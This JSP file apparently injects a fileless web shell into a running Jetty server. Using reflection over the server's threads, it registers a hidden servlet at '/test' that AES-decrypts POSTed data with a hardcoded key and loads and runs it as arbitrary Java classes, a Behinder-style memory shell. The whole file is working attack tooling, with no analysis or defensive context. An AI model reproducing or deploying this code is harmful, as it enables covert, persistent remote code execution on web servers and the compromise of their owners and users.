<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.io.*"%>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="java.security.NoSuchAlgorithmException" %>
<%@ page import="javax.crypto.NoSuchPaddingException" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.security.InvalidKeyException" %>
<%@ page import="javax.crypto.IllegalBlockSizeException" %>
<%@ page import="javax.crypto.BadPaddingException" %>
<%!
class JettyServlet extends HttpServlet {

    @Override
    public void init() throws ServletException {
    }


    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    }

    @Override
    public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String k = "e45e329feb5d925b";
        HttpSession session = req.getSession();
        session.setAttribute("u", k);
        Cipher c = null;
        try {
            c = Cipher.getInstance("AES");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        }
        try {
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }
        javax.servlet.jsp.PageContext pageContext = javax.servlet.jsp.JspFactory.getDefaultFactory().getPageContext(this, req, resp, null, true, 8192, true);
        try {
            class U extends ClassLoader{
                U(ClassLoader c){
                    super(c);
                }
                public Class g(byte []b){
                    return super.defineClass(b,0,b.length);
                }
            }
            new U(this.getClass().getClassLoader()).g(
                    c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()))).newInstance().equals(pageContext);
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void destroy() {
        super.destroy();
    }

}
%>

<%
    String servletName = "myServlet";
    String urlPattern = "/test";
    Servlet servlet = new JettyServlet();
    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;
    for (Thread thread : threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                fieldServletHandler.setAccessible(true);
                Object servletHandler = fieldServletHandler.get(webAppContext);
                Field fieldServlets = servletHandler.getClass().getDeclaredField("_servlets");
                fieldServlets.setAccessible(true);
                Object[] servlets = (Object[]) fieldServlets.get(servletHandler);
                boolean flag = false;
                for(Object s:servlets){
                    Field fieldName = s.getClass().getSuperclass().getDeclaredField("_name");
                    fieldName.setAccessible(true);
                    String name = (String) fieldName.get(s);
                    if(name.equals(servletName)){
                        flag = true;
                        break;
                    }
                }
                if(flag){
                    out.println("[-] Servlet " + servletName + " exists.<br>");
                    return;
                }
                out.println("[+] Add Servlet: " + servletName + "<br>");
                out.println("[+] urlPattern: " + urlPattern + "<br>");
                ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                Class sourceClazz = null;
                Object holder = null;
                Field field = null;
                try{
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                    field = sourceClazz.getDeclaredField("JAVAX_API");
                    Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
                    holder = method.invoke(servletHandler, field.get(null));
                }catch(ClassNotFoundException e){
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                    Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
                    holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                }
                holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
                holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, servlet);
                servletHandler.getClass().getMethod("addServlet", holder.getClass()).invoke(servletHandler, holder);
                Class clazz = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
                Object servletMapping = null;
                try{
                    servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
                }catch(NoSuchMethodException e){
                    servletMapping = clazz.newInstance();
                }
                servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
                servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
                servletHandler.getClass().getMethod("addServletMapping", clazz).invoke(servletHandler, servletMapping);
            }
        }
    }
%>